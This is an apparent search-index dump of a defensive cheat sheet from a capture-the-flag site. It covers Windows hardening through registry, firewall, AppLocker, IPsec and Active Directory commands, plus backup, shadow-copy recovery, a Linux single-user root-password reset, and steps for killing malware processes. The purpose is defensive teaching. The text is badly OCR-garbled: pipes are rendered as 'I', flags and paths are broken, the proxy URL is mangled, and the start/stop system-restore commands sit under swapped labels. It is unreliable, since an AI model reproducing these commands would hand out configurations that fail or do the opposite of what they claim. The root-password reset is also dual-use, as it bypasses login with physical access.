\"HKCU\\ControlPanel\\Accessibility\\Keyboard Response\" /v Flags /t REG_SZ /d 122 /f Disable On-screen Keyboard: C:\\> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI /f /v ShowTabletKeyboard /tREG_DWORD /d 0 Disable Administrative Shares - Workstations: C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /f /v AutoShareWks /t REG_DWORD /d 0 Disable Administrative Shares - Severs C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\ Parameters /f /v AutoShareServer /t REG_DWORD /d 0 Remove Creation of Hashes Used to Pass the Hash Attack (Requires password reset and reboot to purgeold hashes): C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /f /v NoLMHash /t REG_DWORD /d 1 To Disable Registry Editor: (High Risk) C:\\> reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f Disable IE Password Cache: C:\\> reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings /v DisablePasswordCaching /t REG_DWORD /d 1 /f Disable CMD prompt: C:\\> reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f Disable Admin credentials cache on host when usingRDP: C:\\> reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f Do not process the run once list: C:\\> reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisableLocalMachineRunOnce /t REG_DWORD /d 1 C:\\> reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisableLocalMachineRunOnce /t REG_DWORD /d 1 Require User Access Control (UAC) Permission: C:\\> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f Change password at next logon: PS C:\\> Set-ADAccountPassword <USER> -NewPassword $newpwd -Reset -PassThru I Set-ADuser -ChangePasswordAtLogon $True Change password at next logon for OU Group: PS C:\\> Get-ADuser -filter \"department -eq '<OUGROUP>' -AND enabled -eq 'True 111 I Set-AD user -ChangePasswordAtLogon $True Enabled Firewall logging: C:\\> netsh firewall set logging droppedpacketsconnections = enable","title":"windows"},{"location":"capturetheflag/basic/prootect_defend/windows/#disablestop-services","text":"","title":"DISABLE/STOP SERVICES"},{"location":"capturetheflag/basic/prootect_defend/windows/#get-a-list-of-services-and-disable-or-stop","text":"C:\\> sc query C:\\> sc config \"<SERVICE NAME>\" start= disabled C:\\> sc stop \"<SERVICE NAME>\" C:\\> wmic service where name='<SERVICE NAME>' callChangeStartmode Disabled","title":"Get a list of services and disable or stop:"},{"location":"capturetheflag/basic/prootect_defend/windows/#host-system-firewalls","text":"","title":"HOST SYSTEM FIREWALLS"},{"location":"capturetheflag/basic/prootect_defend/windows/#show-all-rules","text":"C:\\> netsh advfirewall firewall show rule name=all","title":"Show all rules:"},{"location":"capturetheflag/basic/prootect_defend/windows/#set-firewall-onoff","text":"C:\\> netsh advfirewall set currentprofile state on C:\\> netsh advfirewall set currentprofilefirewallpolicy blockinboundalways,allowoutbound C:\\> netsh advfirewall set publicprofile state on C:\\> netsh advfirewall set privateprofile state on C:\\> netsh advfirewall set domainprofile state on C:\\> netsh advfirewall set allprofile state on C:\\> netsh advfirewall set allprof ile state","title":"Set firewall on/off:"},{"location":"capturetheflag/basic/prootect_defend/windows/#offset-firewall-rules-examples","text":"C:\\> netsh advfirewall firewall add rule name=\"OpenPort 80\" dir=in action=allow protocol=TCPlocalport=80 C:\\> netsh advfirewall firewall add rule name=\"MyApplication\" dir=in action=al lowprogram=\"C:\\MyApp\\MyApp.exe\" enable=yes C:\\> netsh advfirewall firewall add rule name=\"MyApplication\" dir=in action=al lowprogram=\"C:\\MyApp\\MyApp.exe\" enable=yesremoteip=157.60.0.1,172.16.0.0/16,Local5ubnetprof i le=domain C:\\> netsh advfirewall firewall add rule name=\"MyApplication\" dir=in action=allowprogram=\"C:\\MyApp\\MyApp.exe\" enable=yesremoteip=157.60.0.1,172.16.0.0/16,LocalSubnetprofile=domain C:\\> netsh advfirewall firewall add rule name=\"MyApplication\" dir=in action=al lowprogram=\"C:\\MyApp\\MyApp.exe\" enable=yesremoteip=157.60.0.1,172.16.0.0/16,Local5ubnetprofile=private C:\\> netsh advfirewall firewall delete rulename=rule name program=\"C:\\MyApp\\MyApp.exe\" C:\\> netsh advfirewall firewall delete rulename=rule name protocol=udp localport=500 C:\\> netsh advfirewall firewall set rulegroup=\" remote desktop\" new enable=Yes prof ile=domain C:\\> netsh advfirewall firewall set rulegroup=\"remote desktop\" new enable=No profile=publicSetup","title":"offSet firewall rules examples:"},{"location":"capturetheflag/basic/prootect_defend/windows/#togging-location","text":"C:\\> netsh advfirewall set currentprofile logging C:\\<LOCATION>\\<FILE NAME>Windows firewall tog location and settings: C:\\> more %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log C:\\> netsh advfirewall set allprofile loggingmaxfilesize 4096 C:\\> netsh advfirewall set allprofile loggingdroppedconnections enable C:\\> netsh advfirewall set allprofile loggingallowedconnections enable","title":"togging location:"},{"location":"capturetheflag/basic/prootect_defend/windows/#display-firewall-logs","text":"PS C:\\> Get-Content$env:systemroot\\system32\\LogFiles\\Firewall\\pfirewall. log","title":"Display firewall logs:"},{"location":"capturetheflag/basic/prootect_defend/windows/#passwords","text":"","title":"PASSWORDS"},{"location":"capturetheflag/basic/prootect_defend/windows/#change-password","text":"C:\\> net user <USER NAME> * /domain C:\\> net user <USER NAME> <NEW PASSWORD>","title":"Change password:"},{"location":"capturetheflag/basic/prootect_defend/windows/#change-password-remotely","text":"C:\\> pspasswd.exe \\\\<IP ADDRESS or NAME OF REMOTECOMPUTER> -u <REMOTE USER NAME> -p <NEW PASSWORD>","title":"Change password remotely:"},{"location":"capturetheflag/basic/prootect_defend/windows/#change-password-remotely_1","text":"PS C:\\> pspasswd.exe \\\\<IP ADDRESS or NAME OF REMOTECOMPUTER>HOST FILE","title":"Change password remotely:"},{"location":"capturetheflag/basic/prootect_defend/windows/#flush-dns-of-malicious-domainip","text":"C:\\> ipconfig /flushdns","title":"Flush DNS of malicious domain/IP:"},{"location":"capturetheflag/basic/prootect_defend/windows/#flush-netbios-cache-of-hostip","text":"C:\\> nbtstat -R","title":"Flush NetBios cache of host/IP:"},{"location":"capturetheflag/basic/prootect_defend/windows/#add-new-malicious-domain-to-hosts-file-and-route-tolocalhost","text":"C:\\> echo 127.0.0.1 <MALICIOUS DOMAIN> >> C:\\Windows\\System32\\drivers\\etc\\hosts","title":"Add new malicious domain to hosts file, and route tolocalhost:"},{"location":"capturetheflag/basic/prootect_defend/windows/#check-if-hosts-file-is-working-by-sending-ping-to-127001","text":"C:\\> ping <MALICIOUS DOMAIN> -n 1","title":"Check if hosts file is working, by sending ping to 127.0.0.1:"},{"location":"capturetheflag/basic/prootect_defend/windows/#whitelist-use-a-proxy-auto-configpac-file-to-create-bad-url-or-ip-list-ie-firefox-chrome","text":"function FindProxyForURL(url, host) { // II Send bad DNS name to the proxy if (dnsDomainis(host, \".badsite.com\")) return \"PROXY http:11127.0.0.1:8080\"; // II Send bad IPs to the proxy if (isinNet(myipAddress(), \"222.222.222.222\",\"255.255.255.0\")) return \"PROXY http:11127.0.0.1:8080\"; //II All other traffic bypass proxy return \"DIRECT\"; }","title":"WHITELIST Use a Proxy Auto Config(PAC) file to create Bad URL or IP List (IE, Firefox, Chrome):"},{"location":"capturetheflag/basic/prootect_defend/windows/#application-restrictions","text":"","title":"APPLICATION RESTRICTIONS"},{"location":"capturetheflag/basic/prootect_defend/windows/#applocker-server-2008-r2-or-windows-7-or-higher","text":"","title":"Applocker - Server 2008 R2 or Windows 7 or higher:"},{"location":"capturetheflag/basic/prootect_defend/windows/#using-gui-wizard-configure","text":"Executable Rules (. exe, . com) DLL Rules ( .dll, .ocx) Script Rules (.psl, .bat, .cmd, .vbs, .js) Windows Install Rules ( .msi, .msp, .mst)","title":"Using GUI Wizard configure:"},{"location":"capturetheflag/basic/prootect_defend/windows/#steps-to-employ-applocker-gui-is-needed-for-digitalsigned-app-restrictions","text":"","title":"Steps to employ Applocker (GUI is needed for digitalsigned app restrictions):"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-1","text":"Create a new GPO.","title":"Step 1:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-2","text":"Right-click on it to edit, and then navigate through Computer Configuration, Policies, Windows Settings, Security Settings, Application Control Policies and Applocker. Click Configure Rule Enforcement.","title":"Step 2:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-3","text":"Under Executable Rules, check the Configured box and then make sure Enforce Rules is selected from the drop-down box. Click OK.","title":"Step 3:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-4","text":"In the left pane, click Executable Rules. Step 5: Right-click in the right pane and select Create New Rule.","title":"Step 4:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-6","text":"On the Before You Begin screen, click Next.","title":"Step 6:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-7","text":"On the Permissions screen, click Next.","title":"Step 7:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-8","text":"On the Conditions screen, select the Publisher condition and click Next.","title":"Step 8:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-9","text":"Click the Browse button and browse to any executable file on your system. It doesn't matter which.","title":"Step 9:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-10","text":"Drag the slider up to Any Publisher and then click Next.","title":"Step 10:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-11","text":"Click Next on the Exceptions screen.","title":"Step 11:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-12","text":"Name policy, Example uonly run executables that are signed\" and click Create.","title":"Step 12:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-13","text":"If this is your first time creating an Applocker policy, Windows will prompt you to create default rule, click Yes.","title":"Step 13:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-14","text":"Ensure Application Identity Service isRunning. C:\\> net start AppIDSvc C:\\> REG add\"HKLM\\SYSTEM\\CurrentControlSet\\services\\AppIDSvc\" /v Start /t REG_DWORD /d 2 /f","title":"Step 14:"},{"location":"capturetheflag/basic/prootect_defend/windows/#step-15","text":"Changes require reboot. C:\\ shutdown.exe /r C:\\ shutdown.exe /r /m \\\\<IP ADDRESS OR COMPUTERNAME> /f","title":"Step 15:"},{"location":"capturetheflag/basic/prootect_defend/windows/#add-the-applocker-cmdlets-into-powershell","text":"PS C:\\> import-module Applocker","title":"Add the Applocker cmdlets into PowerShell:"},{"location":"capturetheflag/basic/prootect_defend/windows/#gets-the-file-information-for-all-of-the-executable-files-and-scripts-in-the-directory","text":"C:\\Windows\\System32: PS C:\\> Get-ApplockerFileinformation -Directory C:\\Windows\\System32\\ -Recurse -FileType Exe, Script","title":"Gets the file information for all of the executable files and scripts in the directory"},{"location":"capturetheflag/basic/prootect_defend/windows/#create-a-applocker-policy-that-allow-rules-for-all-of-the-executable-files-in-cwindowssystem32","text":"PS C:\\> Get-Childitem C:\\Windows\\System32\\*,exe IGet-ApplockerFileinformation I New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32","title":"Create a Applocker Policy that allow rules for all of the executable files in C:\\Windows\\System32:"},{"location":"capturetheflag/basic/prootect_defend/windows/#sets-the-local-applocker-policy-to-the-policy-specified-in-cpolicyxml","text":"PS C:\\> Set-AppLockerPolicy -XMLPolicy C:\\Policy.xml","title":"Sets the local Applocker policy to the policy specified in C:\\Policy.xml:"},{"location":"capturetheflag/basic/prootect_defend/windows/#uses-the-applocker-policy-in-cpolicyxml-to-test-whether-calcexe-and-notepadexe-are-allowed-to-run-for-users-who-are-members-of-the-everyone-group-if-you-do-not-specify-a-group-the-everyone-group-is-used-by-default","text":"PS C:\\> Test-AppLockerPolicy -XMLPolicy C:\\Policy.xml -Path C:\\Windows\\System32\\calc.exe, C:\\Windows\\System32\\notepad.exe -User Everyone","title":"Uses the Applocker policy in C:\\Policy.xml to test whether calc.exe and notepad.exe are allowed to run for users who are members of the Everyone group. If you do not specify a group, the Everyone group is used by default:"},{"location":"capturetheflag/basic/prootect_defend/windows/#review-how-many-times-a-file-would-have-been-blocked-from-running-if-rules-were-enforced","text":"PS C:\\> Get-ApplockerFileinformation -Eventlog -Logname \"Microsoft-Windows-Applocker\\EXE and DLL\" -EventType Audited -Statistics","title":"Review how many times a file would have been blocked from running if rules were enforced:"},{"location":"capturetheflag/basic/prootect_defend/windows/#creates-a-new-applocker-policy-from-the-auditedevents-in-the-local-microsoft-windows-applockerexe-and-dll-event-log-applied-to-and-current-applocker-policy-will-be-overwritten","text":"PS C:\\> Get-ApplockerFileinformation -Eventlog -LogPath \"Microsoft-Windows-AppLocker/EXE and DLL\" -EventType Audited I New-ApplockerPolicy -RuleType Publisher,Hash -User domain\\<GROUP> -IgnoreMissingFileinformation I Set-ApplockerPolicy -LDAP \"LDAP://<DC>,<DOMAIN>.com/CN={31B2F340-016D11D2-945F00C04FB984F9},CN=Policies,CN=System,DC=<DOMAIN>,DC=com\"","title":"Creates a new Applocker policy from the auditedevents in the local Microsoft-Windows-Applocker/EXE and DLL event log, applied to  and current Applocker policy will be overwritten:"},{"location":"capturetheflag/basic/prootect_defend/windows/#export-the-local-applocker-policy-comparing-usersexplicitly-denied-access-to-run-and-output-textfile","text":"PS C:\\> Get-AppLockerPolicy -Local I TestAppLockerPolicy -Path C:\\Windows\\System32\\*,exe -User domain\\<USER NAME> -Filter Denied I Format-List -Property Path > C:\\DeniedFiles.txt","title":"Export the local Applocker policy, comparing User'sexplicitly denied access to run, and output textfile:"},{"location":"capturetheflag/basic/prootect_defend/windows/#export-the-results-of-the-test-to-a-file-foranalysis","text":"PS C:\\> Get-Childitem <DirectoryPathtoReview> -Filter <FileExtensionFilter> -Recurse I Convert-Path I Test-ApplockerPolicy -XMLPolicy <PathToExportedPolicyFile> -User <domain\\username> -Filter <TypeofRuletoFilterFor> I Export-CSV <PathToExportResultsTo.CSV>","title":"Export the results of the test to a file foranalysis:"},{"location":"capturetheflag/basic/prootect_defend/windows/#gridview-list-of-any-local-rules-applicable","text":"PS C:\\> Get-AppLockerPolicy -Local -Xml I OutGridView","title":"GridView list of any local rules applicable:"},{"location":"capturetheflag/basic/prootect_defend/windows/#ipsec","text":"","title":"IPSEC"},{"location":"capturetheflag/basic/prootect_defend/windows/#create-a-ipsec-local-security-policy-applied-to-any-connection-any-protocol-and-using-a-preshared-key","text":"C:\\> netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY C:\\> netsh ipsec static add filteraction name=MyIPsecAction action=negotiate C:\\> netsh ipsec static add policy name=MyIPsecPolicy assign=yes C:\\> netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all activate=yes psk=<PASSWORD>","title":"Create a IPSEC Local Security Policy, applied to any connection, any protocol, and using a preshared key:"},{"location":"capturetheflag/basic/prootect_defend/windows/#add-rule-to-allow-web-browsing-port-80http-and-443https-over-ipsec","text":"C:\\> netsh ipsec static add filteraction name=Allow action=permit C:\\> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80 C:\\> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443 C:\\> netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=<PASSWORD>","title":"Add rule to allow web browsing port 80(HTTP) and 443(HTTPS) over IPSEC:"},{"location":"capturetheflag/basic/prootect_defend/windows/#shows-the-ipsec-local-security-policy-with-name-myipsecpolicy","text":"C:\\> netsh ipsec static show policy name=MyIPsecPolicy","title":"Shows the IPSEC Local Security Policy with name \"MyIPsecPolicy\":"},{"location":"capturetheflag/basic/prootect_defend/windows/#stop-or-unassign-a-ipsec-policy","text":"C:\\> netsh ipsec static set policy name=MyIPsecPolicy","title":"Stop or Unassign a IPSEC Policy:"},{"location":"capturetheflag/basic/prootect_defend/windows/#create-a-ipsec-advance-firewall-rule-and-policy-and-preshared-key-from-and-to-any-connections","text":"C:\\> netsh advfirewall consec add rule name=\"IPSEC\" endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default","title":"Create a IPSEC Advance Firewall Rule and Policy and preshared key from and to any connections:"},{"location":"capturetheflag/basic/prootect_defend/windows/#require-ipsec-preshared-key-on-all-outgoing-requests","text":"C:\\> netsh advfirewall firewall add rule name=uIPSEC_Out\" dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any interfacetype=any security=authenticate","title":"Require IPSEC preshared key on all outgoing requests:"},{"location":"capturetheflag/basic/prootect_defend/windows/#create-a-rule-for-web-browsing","text":"C:\\> netsh advfirewall firewall add rule name=\"Allow Outbound Port 8011 dir=out localport=80 protocol=TCP action=allow","title":"Create a rule for web browsing:"},{"location":"capturetheflag/basic/prootect_defend/windows/#create-a-rule-for-dns","text":"C:\\> netsh advfirewall firewall add rule name=\"Allow Outbound Port 5311 dir=out localport=53 protocol=UDP action=allow","title":"Create a rule for DNS:"},{"location":"capturetheflag/basic/prootect_defend/windows/#delete-ispec-rule","text":"C:\\> netsh advfirewall firewall delete rule name=\"IPSEC_RULE\"","title":"Delete ISPEC Rule:"},{"location":"capturetheflag/basic/prootect_defend/windows/#active-directory-ad-group-policy-object-gpo","text":"","title":"ACTIVE DIRECTORY (AD) - GROUP POLICY OBJECT (GPO)"},{"location":"capturetheflag/basic/prootect_defend/windows/#get-and-force-new-policies","text":"C:\\> gpupdate /force C:\\> gpupdate /sync","title":"Get and force new policies:"},{"location":"capturetheflag/basic/prootect_defend/windows/#audit-success-and-failure-for-user-bob","text":"C:\\> auditpol /set /user:bob /category:\"DetailedTracking\" /include /success:enable /failure:enable","title":"Audit Success and Failure for user Bob:"},{"location":"capturetheflag/basic/prootect_defend/windows/#create-an-organization-unit-to-move-suspected-or-infected-users-and-machines","text":"C:\\> dsadd OU <QUARANTINE BAD OU>","title":"Create an Organization Unit to move suspected or infected users and machines:"},{"location":"capturetheflag/basic/prootect_defend/windows/#move-an-active-directory-user-object-into-new-group","text":"PS C:\\> Move-ADObject 'CN=<USER NAME>,CN=<OLD USERGROUP>,DC=<OLD DOMAIN>,DC=<OLD EXTENSION>' -TargetPath 'OU=<NEW USER GROUP>,DC=<OLDDOMAIN>,DC=<OLD EXTENSION>'","title":"Move an active directory user object into NEW GROUP:"},{"location":"capturetheflag/basic/prootect_defend/windows/#alt-option","text":"C:\\> dsmove \"CN=<USER NAME>,OU=<OLD USER OU>,DC=<OLDDOMAIN>,DC=<OLD EXTENSION>\" -newparent OU=<NEW USERGROUP>,DC=<OLD DOMAIN>,DC=<OLD EXTENSION>","title":"Alt Option:"},{"location":"capturetheflag/basic/prootect_defend/windows/#stand-alone-system-without-active-directory-ad","text":"","title":"STAND ALONE SYSTEM - WITHOUT ACTIVE DIRECTORY (AD)"},{"location":"capturetheflag/basic/prootect_defend/windows/#disallow-running-a-exe-file","text":"C:\\> reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v DisallowRun /t REG_DWORD /d\"00000001\" /f C:\\> reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun\" /v badfile.exe /t REG_SZ/d <BAD FILE NAME>.exe /f","title":"Disallow running a .exe file:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-remote-desktop","text":"C:\\> reg add \"HKLM\\SYSTEM\\Cu rrentCont ro lSet\\Cont ro l \\ TerminalServer\" /f /v fDenyTSConnections /t REG_DWORD /d 1","title":"Disable Remote Desktop:"},{"location":"capturetheflag/basic/prootect_defend/windows/#send-ntlmv2-response-onlyrefuse-lm-and-ntlmwindows-7-default","text":"C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /vlmcompatibilitylevel /t REG_DWORD /d 5 /f","title":"Send NTLMv2 response only/refuse LM and NTLM:(Windows 7 default)"},{"location":"capturetheflag/basic/prootect_defend/windows/#restrict-anonymous-access","text":"C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v restrictanonymous /t REG_DWORD /d 1 /f","title":"Restrict Anonymous Access:"},{"location":"capturetheflag/basic/prootect_defend/windows/#do-not-allow-anonymous-enumeration-of-sam-accounts-and-shares","text":"C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v restrictanonymoussam /t REG_DWORD /d 1 /f","title":"Do not allow anonymous enumeration of SAM accounts and shares:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-ipv6","text":"C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TCPIP6\\Parameters /v DisabledComponents /t REG_DWORD /d 255 /f","title":"Disable IPV6:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-sticky-keys","text":"C:\\> reg add \"HKCU\\ControlPanel\\Accessibility\\StickyKeys\" /v Flags /t REG_SZ/d 506 /f","title":"Disable sticky keys:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-toggle-keys","text":"C:\\> reg add \"HKCU\\ControlPanel \\Accessibility\\ ToggleKeys\" /v Flags /t REG_SZId 58 /f","title":"Disable Toggle Keys:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-filter-keys","text":"C:\\> reg add \"HKCU\\ControlPanel\\Accessibility\\Keyboard Response\" /v Flags /t REG_SZ /d 122 /f","title":"Disable Filter Keys:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-on-screen-keyboard","text":"C:\\> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI /f /v ShowTabletKeyboard /tREG_DWORD /d 0","title":"Disable On-screen Keyboard:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-administrative-shares-workstations","text":"C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /f /v AutoShareWks /t REG_DWORD /d 0","title":"Disable Administrative Shares - Workstations:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-administrative-shares-severs","text":"C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\ Parameters /f /v AutoShareServer /t REG_DWORD /d 0","title":"Disable Administrative Shares - Severs"},{"location":"capturetheflag/basic/prootect_defend/windows/#remove-creation-of-hashes-used-to-pass-the-hash-attack-requires-password-reset-and-reboot-to-purgeold-hashes","text":"C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /f /v NoLMHash /t REG_DWORD /d 1","title":"Remove Creation of Hashes Used to Pass the Hash Attack (Requires password reset and reboot to purgeold hashes):"},{"location":"capturetheflag/basic/prootect_defend/windows/#to-disable-registry-editor-high-risk","text":"C:\\> reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f","title":"To Disable Registry Editor: (High Risk)"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-ie-password-cache","text":"C:\\> reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings /v DisablePasswordCaching /t REG_DWORD /d 1 /f","title":"Disable IE Password Cache:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-cmd-prompt","text":"C:\\> reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f","title":"Disable CMD prompt:"},{"location":"capturetheflag/basic/prootect_defend/windows/#disable-admin-credentials-cache-on-host-when-usingrdp","text":"C:\\> reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f","title":"Disable Admin credentials cache on host when usingRDP:"},{"location":"capturetheflag/basic/prootect_defend/windows/#do-not-process-the-run-once-list","text":"C:\\> reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisableLocalMachineRunOnce /t REG_DWORD /d 1 C:\\> reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisableLocalMachineRunOnce /t REG_DWORD /d 1","title":"Do not process the run once list:"},{"location":"capturetheflag/basic/prootect_defend/windows/#require-user-access-control-uac-permission","text":"C:\\> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f","title":"Require User Access Control (UAC) Permission:"},{"location":"capturetheflag/basic/prootect_defend/windows/#change-password-at-next-logon","text":"PS C:\\> Set-ADAccountPassword <USER> -NewPassword $newpwd -Reset -PassThru I Set-ADuser -ChangePasswordAtLogon $True","title":"Change password at next logon:"},{"location":"capturetheflag/basic/prootect_defend/windows/#change-password-at-next-logon-for-ou-group","text":"PS C:\\> Get-ADuser -filter \"department -eq '<OUGROUP>' -AND enabled -eq 'True 111 I Set-AD user -ChangePasswordAtLogon $True","title":"Change password at next logon for OU Group:"},{"location":"capturetheflag/basic/prootect_defend/windows/#enabled-firewall-logging","text":"C:\\> netsh firewall set logging droppedpacketsconnections = enable","title":"Enabled Firewall logging:"},{"location":"capturetheflag/basic/recover/backuo/","text":"WINDOWS Backup GPO Audit Policy to backup file: C:\\> auditpol /backup /file:C\\auditpolicy.csv Restore GPO Audit Policy from backup file: C:\\> auditpol /restore /file:C:\\auditpolicy.csv Backup All GPOs in domain and save to Path: PS C:\\> Backup-Gpo -All -Path \\\\<SERVER>\\<PATH TOBACKUPS> Restore All GPOs in domain and save to Path: PS C:\\> Restore-GPO -All -Domain <INSERT DOMAINNAME> -Path \\\\Serverl\\GpoBackups Start Volume Shadow Service: C:\\> net start VSS List all shadow files and storage: C:\\> vssadmin List ShadowStorage List all shadow files: C:\\> vssadmin List Shadows Browse Shadow Copy for files/folders: C:\\> mklink /d c:\\<CREATE FOLDER>\\<PROVIDE FOLDERNAME BUT DO NOT CREATE>\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyl\\ Revert back to a selected shadow file on Windows Server and Windows 8: C:\\> vssadmin revert shadow /shadow={<SHADOW COPYID>} /ForceDismount List a files previous versions history using volrest.exe: Ref. https://www.microsoft.com/enus/download/details.aspx?id=17657 C:\\> \"\\Program Files (x86)\\Windows ResourceKits\\Tools\\volrest.exe\" \"\\\\localhost\\c$\\<PATH TOFILE>\\<FILE NAME>\" Revert back to a selected previous file version or @GMT file name for specific previous version using volrest.exe: C:\\> subst Z: \\\\localhost\\c$\\$\\<PATH TO FILE> C:\\> \"\\Program Files (x86)\\Windows ResourceKits\\Tools\\volrest.exe\" \"\\\\localhost\\c$\\<PATH TOFILE>\\<CURRENT FILE NAME OR @GMT FILE NAME FROM LISTCOMMAND ABOVE>\" /R:Z:\\ C:\\> subst Z: /0 Revert back a directory and subdirectory filesprevious version using volrest.exe: C: \\> \"\\Program Files (x86) \\Windows ResourceKits\\Tools\\volrest.exe\" \\\\localhost\\c$\\<PATH TOFOLDER\\*\u00b7* /5 /r:\\\\localhost\\c$\\<PATH TO FOLDER>\\ Revert back to a selected shadow file on Windows Server and Windows 7 and 10 using wmic: C:\\> wmic shadowcopy call create Volume='C:\\' Create a shadow copy of volume C on Windows 7 and 10 using PowerShell: PS C:\\> (gwmi -listwin32_shadowcopy).Create('C:\\', 'ClientAccessible') Create a shadow copy of volume C on Windows Server 2003 and 2008: C:\\> vssadmin create shadow /for=c: Create restore point on Windows: C:\\> wmic.exe /Namespace:\\\\root\\default Path SystemRestore Call CreateRestorePoint \"%DATE%\", 100, Start system restore points on Windows XP: C:\\> sc config srservice start= disabled C:\\> reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f C:\\> net stop srservice Stop system restore points on Windows XP: C:\\> sc config srservice start= Auto C:\\> net start srservice C:\\> reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 0 /f List of restore points: PS C:\\> Get-ComputerRestorePoint Restore from a specific restore point: PS C:\\> Restore-Computer -RestorePoint <RESTOREPOINT#> -Confirm LINUX Reset root password in single user mode: Step 1: Reboot system. reboot -f Step 2: Press ESC at GRUB screen. Step 3: Select default entry and then 'e' for edit. Step 4: Scroll down until, you see a line that starts with linux, linux16 or linuxefi. Step 5: At end of that line leave a space and add without quote 'rw init=/bin/bash' Step 6: Press Ctrl-X to reboot. Step 7: After reboot, should be in single user modeand root, change password. passwd Step 8: Reboot system. # reboot -f Reinstall a package: # apt-get install --reinstall <COMPROMISED PACKAGENAME> Reinstall all packages: # apt-get install --reinstall $(dpkg --getselections lgrep -v deinstall) KILL MALWARE PROCESS WINDOWS Malware Removal: Ref. http://www.gmer.net/ C:\\> gmer.exe (GUI) Kill running malicious file: C:\\> gmer.exe -killfile C:\\WINDOWS\\system32\\drivers\\<MALICIOUS FILENAME>.exe Kill running malicious file in PowerShell: PS C:\\> Stop-Process -Name <PROCESS NAME> PS C:\\> Stop-Process -ID <PID> LINUX Stop a malware process: kill <MALICIOUS PID> Change the malware process from execution and move: chmod -x /usr/sbin/<SUSPICIOUS FILE NAME> mkdir /home/quarantine/ mv /usr/sbin/<SUSPICIOUS FILE 